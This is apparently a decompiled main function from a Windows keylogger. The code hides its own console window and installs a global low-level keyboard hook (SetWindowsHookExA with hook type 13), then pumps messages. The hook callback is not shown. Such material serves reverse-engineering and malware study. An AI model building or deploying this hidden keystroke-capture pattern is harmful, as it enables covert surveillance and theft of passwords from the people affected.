int __cdecl main(int argc, const char **argv, const char **envp)
{
  HMODULE v3; // eax
  HWND hWnd; // [esp+0h] [ebp-8h]
  HHOOK hhk; // [esp+4h] [ebp-4h]

  AllocConsole();
  hWnd = FindWindowA(ClassName, 0);
  if ( hWnd )
    ShowWindow(hWnd, 0);
  memset(byte_405350, 1, 0x400u);
  v3 = GetModuleHandleA(0);
  hhk = SetWindowsHookExA(13, fn, v3, 0);
  while ( GetMessageA(0, 0, 0, 0) )
    ;
  return UnhookWindowsHookEx(hhk);
}
